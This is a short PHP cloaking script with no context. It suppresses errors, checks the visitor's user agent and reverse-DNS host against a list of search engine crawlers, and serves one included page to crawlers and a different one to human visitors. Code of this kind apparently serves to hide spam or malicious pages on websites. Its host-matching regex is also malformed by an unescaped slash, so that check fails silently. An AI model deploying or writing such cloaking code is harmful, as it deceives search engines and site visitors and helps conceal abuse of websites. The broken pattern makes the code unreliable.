<?php
error_reporting(0);
ini_set("display_errors", 0);
//$refer = $_SERVER['HTTP_REFERER'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
if(preg_match("/Googlebot|MJ12bot|msnbot|bingbot|Slurp|Baiduspider|DuckDuckBot|Sogou|Exabot|facebot|facebookexternalhit|ia_archiver|yandexbot/i", $agent) || preg_match('/\.googlebot|googlebot\.com|yahoo\.com|baidu\.com|sogou\.com|duckduckgo\.com|exabot\.com|facebook/.com|alexa\.com|search\.msn\.com|msn\.com$/i', $host)) {
include('single.php');
}
else {
include('user.php');
}
?>
